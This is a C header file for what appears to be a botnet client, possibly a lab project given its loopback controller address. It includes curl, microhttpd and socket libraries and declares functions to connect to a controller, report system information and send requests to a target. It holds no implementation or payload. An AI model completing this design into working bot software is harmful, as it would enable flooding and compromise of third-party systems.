#ifndef BOT_H
#define BOT_H

#define handle_error_en(en, msg) \
    do                           \
    {                            \
        errno = en;              \
        perror(msg);             \
        exit(-1);                \
    } while (0)
#define handle_error(msg) \
    do                    \
    {                     \
        perror(msg);      \
        exit(-1);         \
    } while (0)

#include <curl/curl.h>
#include <microhttpd.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/sysinfo.h>
#include <string.h>
#include <sys/utsname.h>


#define C_PORT "PORT"
#define C_IP "IP"
#define PROTOCOL "http://"
#define CONTROLLER_PORT 8081L
#define CONTROLLER_IP "127.0.1.1"


void setBotIP();
int connectToController();
int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                   const char *method, const char *version, const char *upload_data,
                   size_t *upload_data_size, void **con_cls);
int sendRequestToTarget(const char* request);
int sendSystemInfo(char * info);


#endif